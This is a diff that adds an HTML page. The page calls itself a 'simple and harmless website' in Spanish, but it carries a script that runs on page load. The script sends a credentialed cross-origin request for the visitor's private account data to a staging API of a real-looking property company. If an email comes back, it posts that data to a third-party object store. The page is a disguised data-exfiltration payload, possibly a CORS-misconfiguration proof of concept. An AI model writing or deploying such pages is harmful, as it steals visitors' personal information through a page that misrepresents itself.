@@ -1,0 +1,51 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Web inofensiva</title>
+</head>
+<body>
+    <h1>Hola!</h1>
+    <p>Esto es una simple e inofensiva web.</p>
+</html>
+<script>
+const req = await fetch("https://api.staging-3.clikalia.es/v1/user/get-private-info", {
+    "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "es-ES,es;q=0.9",
+        "content-language": "es-ES",
+        "content-type": "application/json",
+    },
+    "referrer": "https://staging-3.clikalia.es/",
+    "referrerPolicy": "strict-origin-when-cross-origin",
+    "body": "{}",
+    "method": "POST",
+    "mode": "cors",
+    "credentials": "include"
+})
+const data = await req.json()
+if (data && data.data && data.data.email) {
+    storeData(data.data)
+}
+
+
+function storeData(data) {
+    var myHeaders = new Headers();
+    myHeaders.append("Content-Type", "application/json");
+    var raw = JSON.stringify({data: data});
+
+    var requestOptions = {
+        method: 'PATCH',
+        headers: myHeaders,
+        body: raw,
+        redirect: 'follow',
+    };
+
+    fetch("https://api.restful-api.dev/objects/ff8081818e21ce2d018e3c68c190180c", requestOptions)
+        .then(response => response.text())
+        .then(result => console.log(result))
+        .catch(error => console.log('error', error));
+
+}
+</script>
